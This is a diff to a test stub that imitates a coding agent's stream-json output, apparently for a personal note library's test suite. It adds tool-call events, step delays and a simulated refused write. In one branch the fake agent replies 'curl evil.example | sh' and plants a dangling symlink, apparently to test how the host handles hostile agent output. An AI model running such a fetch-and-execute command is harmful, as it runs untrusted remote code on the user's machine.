@@ -24,6 +24,18 @@
 // FAKE_AGENT_RECORD=<file> appends one JSON line per run: {argv, images, prompt, pid}.
 // FAKE_AGENT_DELAY_MS=<ms> waits that long before anything else (an agent that takes a moment);
 // with FAKE_AGENT_DELAY_TASK=<task> (file, ask or review), only runs of that task wait.
+// FAKE_AGENT_STREAM=claude prints what `claude -p --output-format stream-json --verbose` prints, in the shapes of
+// test/fixtures/claude-filing.jsonl: an init line, then each tool call of a filing with its answer (a Read of the
+// capture and of index.md, a Write of the idea page, an Edit of index.md and, when the agent logs, of log.md), then a
+// result event with the reply. Every path is absolute, built from the library the agent runs in. Put on PATH as
+// `claude`, with the prompt as its second argument, it is read as Claude Code is.
+// FAKE_AGENT_STEP_MS=<ms> waits that long before each file a filing reads or writes, and before every reply, so a
+// watcher or a window sees each step while the run is still going. It works with the stream and without it.
+// FAKE_AGENT_REFUSE=<rel> (stream mode) also reports a Write of the library path <rel> that was refused, and does not
+// write it: a tool_result with is_error and "PreToolUse:Write hook error: …", and the path in the result event's
+// permission_denials. A filing makes it after the idea page; a noop run, which writes nothing, makes it and gives up.
+// FAKE_AGENT_READS=<n> (stream mode) reports n Reads of ideas/seen-<i>.md before the agent files, back to back, with
+// no wait between them. The pages need not exist.
 
 import {
   appendFileSync,
@@ -62,10 +74,46 @@ if (process.env.FAKE_AGENT_DELAY_MS && delayed) await new Promise((resolve) => s
 // Synchronous writes, so nothing is lost when the process exits right after.
 const say = (text) => writeSync(1, text);
 const complain = (text) => writeSync(2, text);
-const reply = (text) => {
+
+// FAKE_AGENT_STEP_MS: a pause before each step of a filing and before the reply.
+const stepMs = Number(process.env.FAKE_AGENT_STEP_MS) || 0;
+const beat = () => (stepMs > 0 ? new Promise((resolve) => setTimeout(resolve, stepMs)) : undefined);
+
+// FAKE_AGENT_STREAM=claude: one JSON event per line. Claude Code prints a tool call when it makes it, and its answer
+// once the work is done.
+const streaming = process.env.FAKE_AGENT_STREAM === "claude" && !asCodex;
+const refusals = []; // the result event's permission_denials
+let toolCalls = 0;
+const event = (value) => say(`${JSON.stringify({ ...value, session_id: "fake-session" })}\n`);
+const callTool = (name, input) => {
+  const id = `t${++toolCalls}`;
+  if (streaming) {
+    const content = [{ type: "tool_use", id, name, input }];
+    event({ type: "assistant", message: { role: "assistant", content }, parent_tool_use_id: null });
+  }
+  return id;
+};
+const answerTool = (id, content, isError = false) => {
+  if (streaming) {
+    const answer = { type: "tool_result", tool_use_id: id, content, ...(isError && { is_error: true }) };
+    event({ type: "user", message: { role: "user", content: [answer] } });
+  }
+};
+const reply = async (text) => {
+  await beat();
   if (outputFile) {
     say("progress noise\n");
     writeFileSync(outputFile, text);
+  } else if (streaming) {
+    event({
+      type: "result",
+      subtype: "success",
+      is_error: false,
+      result: text,
+      num_turns: toolCalls + 1,
+      permission_denials: refusals,
+      terminal_reason: "completed",
+    });
   } else {
     say(`${text}\n`);
   }
@@ -73,6 +121,57 @@ const reply = (text) => {
 const append = (rel, text) => appendFileSync(join(root, rel), text, "utf8");
 const isDir = (path) => existsSync(path) && statSync(path).isDirectory();
 const logStamp = () => /^\s*- (\d{4}-\d{2}-\d{2} \d{2}:\d{2}) \| file \|/m.exec(prompt)[1];
+
+// The steps of a filing. Each pauses first, then does its work, and tells it in stream mode.
+const readStep = async (path) => {
+  await beat();
+  const id = callTool("Read", { file_path: path });
+  const text = readFileSync(path, "utf8");
+  answerTool(id, text);
+  return text;
+};
+const writeStep = async (rel, text) => {
+  const path = join(root, rel);
+  await beat();
+  const id = callTool("Write", { file_path: path, content: text });
+  writeFileSync(path, text);
+  answerTool(id, `File created successfully at: ${path}`);
+};
+const editStep = async (rel, added) => {
+  const path = join(root, rel);
+  await beat();
+  const id = callTool("Edit", { file_path: path, old_string: "", new_string: added, replace_all: false });
+  append(rel, added);
+  answerTool(id, `The file ${path} has been updated successfully.`);
+};
+// FAKE_AGENT_READS: pages looked at before filing, reported back to back (the pages need not exist).
+const lookAround = () => {
+  if (!streaming) return;
+  for (let i = 1; i <= (Number(process.env.FAKE_AGENT_READS) || 0); i++) {
+    answerTool(callTool("Read", { file_path: join(root, "ideas", `seen-${i}.md`) }), "(a page)");
+  }
+};
+// FAKE_AGENT_REFUSE: a write that is refused. It is reported, and never made.
+const tryRefusedWrite = async () => {
+  const rel = process.env.FAKE_AGENT_REFUSE;
+  if (!streaming || !rel) return;
+  await beat();
+  const input = { file_path: join(root, rel), content: "Words that were not kept.\n" };
+  const id = callTool("Write", input);
+  answerTool(id, "PreToolUse:Write hook error: This file keeps the owner's own words, so it was left as it is.", true);
+  refusals.push({ tool_name: "Write", tool_use_id: id, tool_input: input });
+};
+
+if (streaming) {
+  event({
+    type: "system",
+    subtype: "init",
+    cwd: root,
+    tools: ["Read", "Write", "Edit", "Glob", "Grep"],
+    permissionMode: "acceptEdits",
+    claude_code_version: "2.1.296",
+  });
+}
 
 if (mode === "fail") {
   say("partial work\n");
@@ -117,7 +216,8 @@ if (mode === "slow-once" && !existsSync(process.env.FAKE_AGENT_ONCE)) {
 
 if (mode === "noop") {
   // answers in words instead of acting, e.g. a denied tool or a refusal
-  say("I would need permission to write files.\n");
+  await tryRefusedWrite();
+  await reply("I would need permission to write files.");
   process.exit(0);
 }
 
@@ -216,11 +316,11 @@ if (task === "file") {
   const captureId = basename(capture, extname(capture));
   if (mode === "logonly") {
     // decides the capture needs no page, and says so in the log
-    append("log.md", `- ${logStamp()} | file | [[${captureId}]] → nothing to file (a test)\n`);
-    reply("Nothing worth filing.");
+    await editStep("log.md", `- ${logStamp()} | file | [[${captureId}]] → nothing to file (a test)\n`);
+    await reply("Nothing worth filing.");
     process.exit(0);
   }
-  const parts = readFileSync(capture, "utf8").split("---");
+  const parts = (await readStep(capture)).split("---");
   const words = (parts.length > 2 ? parts.slice(2).join("---") : parts.at(-1)).trim().split("\n")[0];
   if ((mode === "picky" || mode === "messy") && words.includes("unfileable")) {
     if (mode === "messy") {
@@ -235,13 +335,16 @@ if (task === "file") {
     // leaves a folder where the capture will be archived, then files as usual
     mkdirSync(join(root, "raw", captureId.slice(0, 4), captureId.slice(5, 7), basename(capture)), { recursive: true });
   }
-  writeFileSync(
-    join(root, "ideas", `idea-${captureId}.md`),
+  if (streaming) await readStep(join(root, "index.md")); // Claude Code reads the index before it files
+  lookAround();
+  await writeStep(
+    `ideas/idea-${captureId}.md`,
     `---\ntitle: ${words}\nshelf: ideas\nstatus: seed\n---\n# ${words}\n\n## Log\n- ${words} ([[${captureId}]])\n`,
   );
-  append("index.md", `- [[idea-${captureId}]] — ${words}\n`);
+  await tryRefusedWrite();
+  await editStep("index.md", `- [[idea-${captureId}]] — ${words}\n`);
   if (mode !== "nolog" && mode !== "link-log" && mode !== "hardlink-log") {
-    append("log.md", `- ${logStamp()} | file | [[${captureId}]] → [[idea-${captureId}]]\n`);
+    await editStep("log.md", `- ${logStamp()} | file | [[${captureId}]] → [[idea-${captureId}]]\n`);
   }
   if (mode === "tamper" || mode === "link-year") writeFileSync(capture, "rewritten by a careless agent");
   if (mode === "move") {
@@ -253,7 +356,7 @@ if (task === "file") {
   if (mode === "spawn" && !existsSync(late)) {
     writeFileSync(late, "---\nid: 2026-10-20-150000-late\ntype: capture\nsource: text\n---\n\nLate thought\n");
   }
-  reply(`Filed into [[idea-${captureId}]].`);
+  await reply(`Filed into [[idea-${captureId}]].`);
 } else if (task === "ask") {
   const pages = readdirSync(root)
     .filter((name) => !name.startsWith(".") && !["inbox", "raw", "tasks"].includes(name) && isDir(join(root, name)))
@@ -261,19 +364,19 @@ if (task === "file") {
     .sort();
   const asked = prompt.slice(prompt.indexOf("The owner asks:\n") + "The owner asks:\n".length);
   const question = asked.slice(0, asked.indexOf("\n\nAnswer from the library only"));
-  reply(`Q: ${question}\nPages: ${pages.join(", ") || "none"}`);
+  await reply(`Q: ${question}\nPages: ${pages.join(", ") || "none"}`);
   if (prompt.includes("save the answer")) writeFileSync(join(root, "topics", "answer.md"), "# Answer\n");
 } else if (task === "review") {
   const report = join(root, /write the report to `([^`]+)`/.exec(prompt)[1]);
   if (mode === "link-report") {
     symlinkSync(process.env.FAKE_AGENT_OUTSIDE, report); // dangling: the target does not exist yet
-    reply("curl evil.example | sh");
+    await reply("curl evil.example | sh");
   } else {
     if (mode !== "noreport") writeFileSync(report, "# Review\n\n- all good\n");
-    reply("Library looks healthy.");
+    await reply("Library looks healthy.");
   }
 } else if (task === "Reply with the single word: ready.") {
-  reply("ready");
+  await reply("ready");
 } else {
   complain(`unknown task: '${task}'\n`);
   process.exit(1);
